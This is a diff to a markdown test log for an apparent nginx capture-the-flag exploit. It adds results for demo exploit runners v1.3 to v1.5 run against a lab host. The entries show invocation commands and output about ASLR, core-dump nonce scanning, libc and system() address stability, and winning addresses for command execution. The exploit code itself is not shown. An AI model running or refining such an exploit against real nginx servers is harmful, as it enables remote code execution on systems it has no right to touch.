@@ -1,6 +1,6 @@
 # Nginx Rift CTF Tests
 
-Last updated: 2026-05-15 05:06:15 CEST
+Last updated: 2026-05-15 05:17:45 CEST
 
 ## Baseline: Original PoC Command Execution
 
@@ -519,3 +519,91 @@ run artifact: artifacts/demo_v1_2_20260515-050555.json
 ```
 
 Status: pass. This is the preferred technical demo runner.
+
+## Demo Runner v1.3 Strict Freshness And Layout Validation
+
+Purpose: verify re-derived pre-probe worker facts, strict core PID matching, and pre-reset/final layout stability checks.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_3.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+randomize_va_space: 2
+initial worker PID: 2602
+reset core PID matches expected worker 2604
+reset core nonce found: 928 URI-safe / 10437 slots
+pre-reset to final worker: nginx writable map stable
+pre-reset to final worker: libc base stable
+pre-reset to final worker: system address stable
+winning address: 0x557f3875677a
+winning body offset: 0
+run artifact: artifacts/demo_v1_3_20260515-051328.json
+```
+
+Status: pass.
+
+## Demo Runner v1.4 Strict Preflight And Candidate Filter
+
+Purpose: fail fast on wrong lab/core settings and filter impossible final candidates before exploit attempts.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_4.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+strict preflight: enabled
+initial worker PID: 2680
+reset core PID matches expected worker 2681
+reset core nonce found: 896 URI-safe / 10437 slots
+final payload size: 105
+candidate sanity kept: 45
+candidate sanity dropped: 0
+winning address: 0x55b9f862777a
+winning body offset: 0
+run artifact: artifacts/demo_v1_4_20260515-051517.json
+```
+
+Status: pass.
+
+## Demo Runner v1.5 Round Campaign Mode
+
+Purpose: add bounded retry rounds with fresh nonce/core state if an exploit round is exhausted.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_5.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --rounds 2 --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+exploit rounds: 2
+round 1 reset core PID matches expected worker 2759
+round 1 reset core nonce found: 928 URI-safe / 10437 slots
+candidate sanity kept: 166
+candidate sanity dropped: 0
+winning address: 0x557c5768677a
+winning body offset: 0
+run artifact: artifacts/demo_v1_5_20260515-051730.json
+```
+
+Status: pass. The first round won, so round 2 was not needed.
